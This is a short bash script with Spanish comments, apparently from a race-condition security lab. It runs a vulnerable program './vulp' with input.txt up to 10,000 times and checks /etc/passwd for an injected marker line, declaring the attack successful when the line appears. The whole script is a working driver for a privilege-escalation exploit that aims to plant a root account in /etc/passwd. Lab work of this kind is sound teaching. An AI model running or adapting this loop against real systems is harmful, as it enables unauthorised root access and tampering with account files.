#!/bin/bash

for i in {1..10000}
do
    echo "Intento #$i"
    ./vulp < input.txt

    # Verificar si ya se insertó la línea
    if grep -q "🔥ROOTED🔥" /etc/passwd; then
        echo "✅ ¡Ataque exitoso en el intento #$i!"
        exit 0
    fi
done

echo "❌ No se logró el ataque después de 10,000 intentos"
